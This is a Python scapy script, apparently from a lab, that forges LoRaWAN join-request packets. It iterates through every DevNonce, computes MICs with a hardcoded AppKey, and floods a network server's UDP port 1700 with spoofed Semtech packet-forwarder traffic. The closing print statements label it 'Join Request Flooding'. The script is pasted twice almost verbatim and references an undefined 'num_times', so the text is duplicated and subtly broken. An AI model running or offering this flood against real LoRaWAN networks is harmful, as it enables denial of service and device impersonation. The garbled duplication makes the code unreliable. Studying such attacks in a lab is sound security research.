import json
import codecs
import struct
import binascii
from Crypto.Cipher import AES
import base64
from scapy.all import *

hex_dump = '020b5e00b4562d94afcda48d7b227278706b223a5b7b2274696d65223a22323032332d30352d32305431303a34323a30362b30323a3030222c22746d6d73223a313336383630373334343939332c22746d7374223a313638343537323132362c226368616e223a302c2272666368223a302c2273746174223a312c2266726571223a3836382e312c22627264223a302c2272737369223a2d36302c2264617472223a225346374257313235222c226d6f6475223a224c4f5241222c22636f6472223a22342f35222c226c736e72223a372c2273697a65223a32332c2264617461223a22414141414141414141414141633145634534703763594d4a614e39314167413d227d5d2c2273746174223a7b2274696d65223a22323032332d30352d32302030383a34323a303620555443222c226c617469223a35302e38313831373439373637313133352c226c6f6e67223a342e34343332343031363537313034352c22616c7469223a302c2272786e62223a3435342c2275786f6b223a3435342c2272786677223a3336382c2261636b72223a3435332c2264776e62223a3932392c2274786e62223a3336377d7d'

byte_data = codecs.decode(hex_dump, 'hex')
semtech_header = byte_data[:12]
start = byte_data.find(b'{')
end = byte_data.rfind(b'}') + 1
json_string = byte_data[start:end].decode()
json_data = json.loads(json_string)

MHDR = 0x00  
DevEUI = "83717b8a131c5173"
AppEUI = "0000000000000000"
AppKey = "e0500f4e614a81fe29341e17a7eb8e1b"

src_ip_address = "192.168.56.102"  # replace with your source IP address
src_port = 56300  # replace with your source port
dst_ip_address = "192.168.56.104"  # replace with your destination IP address
dst_port = 1700  # replace with your destination port

# Get the start time
start_time = time.time()

for DevNonce_int in range(0, 65536):
    DevNonce = DevNonce_int.to_bytes(2, byteorder='little')
    msg = struct.pack(">B8s8sH",
                      MHDR,
                      binascii.unhexlify(AppEUI)[::-1],
                      binascii.unhexlify(DevEUI)[::-1],
                      DevNonce_int)
    B0 = b'\x49' + b'\x00' * 7 + b'\x00' + b'\x00' + b'\x00' + b'\x00' + struct.pack(">B", len(msg)) + msg
    key = binascii.unhexlify(AppKey)
    cipher = AES.new(key, AES.MODE_ECB)
    mic = cipher.encrypt(B0)[-4:]
    msg += mic
    msg_base64 = base64.b64encode(msg)
    json_data['rxpk'][0]['data'] = msg_base64.decode()

    payload = json.dumps(json_data).encode()
    packet = semtech_header + payload
    send(IP(src=src_ip_address, dst=dst_ip_address)/UDP(sport=src_port, dport=dst_port)/Raw(load=packet))
    time.sleep(0)

# Get the end time
end_time = time.time()


 # Calculate the total execution time
execution_time = end_time - start_time   

import json
import codecs
import struct
import binascii
from Crypto.Cipher import AES
import base64
from scapy.all import *

hex_dump = '020b5e00b4562d94afcda48d7b227278706b223a5b7b2274696d65223a22323032332d30352d32305431303a34323a30362b30323a3030222c22746d6d73223a313336383630373334343939332c22746d7374223a313638343537323132362c226368616e223a302c2272666368223a302c2273746174223a312c2266726571223a3836382e312c22627264223a302c2272737369223a2d36302c2264617472223a225346374257313235222c226d6f6475223a224c4f5241222c22636f6472223a22342f35222c226c736e72223a372c2273697a65223a32332c2264617461223a22414141414141414141414141633145634534703763594d4a614e39314167413d227d5d2c2273746174223a7b2274696d65223a22323032332d30352d32302030383a34323a303620555443222c226c617469223a35302e38313831373439373637313133352c226c6f6e67223a342e34343332343031363537313034352c22616c7469223a302c2272786e62223a3435342c2275786f6b223a3435342c2272786677223a3336382c2261636b72223a3435332c2264776e62223a3932392c2274786e62223a3336377d7d'

byte_data = codecs.decode(hex_dump, 'hex')
semtech_header = byte_data[:12]
start = byte_data.find(b'{')
end = byte_data.rfind(b'}') + 1
json_string = byte_data[start:end].decode()
json_data = json.loads(json_string)

MHDR = 0x00  
DevEUI = "83717b8a131c5173"
AppEUI = "0000000000000000"
AppKey = "e0500f4e614a81fe29341e17a7eb8e1b"

src_ip_address = "192.168.56.102"  # replace with your source IP address
src_port = 56300  # replace with your source port
dst_ip_address = "192.168.56.104"  # replace with your destination IP address
dst_port = 1700  # replace with your destination port

# Get the start time
start_time = time.time()

for DevNonce_int in range(0, 65536):
    DevNonce = DevNonce_int.to_bytes(2, byteorder='little')
    msg = struct.pack(">B8s8sH",
                      MHDR,
                      binascii.unhexlify(AppEUI)[::-1],
                      binascii.unhexlify(DevEUI)[::-1],
                      DevNonce_int)
    B0 = b'\x49' + b'\x00' * 7 + b'\x00' + b'\x00' + b'\x00' + b'\x00' + struct.pack(">B", len(msg)) + msg
    key = binascii.unhexlify(AppKey)
    cipher = AES.new(key, AES.MODE_ECB)
    mic = cipher.encrypt(B0)[-4:]
    msg += mic
    msg_base64 = base64.b64encode(msg)
    json_data['rxpk'][0]['data'] = msg_base64.decode()

    payload = json.dumps(json_data).encode()
    packet = semtech_header + payload
    send(IP(src=src_ip_address, dst=dst_ip_address)/UDP(sport=src_port, dport=dst_port)/Raw(load=packet))
    time.sleep(0)

# Get the end time
end_time = time.time()


 # Calculate the total execution time
execution_time = end_time - start_time   


print("Join Request Flooding Statistics")
print(f"Packets sent: {num_times}")
print(f"Start time: {time.ctime(start_time)}")
print(f"End time: {time.ctime(end_time)}")
print(f"Total execution time: {execution_time} seconds")
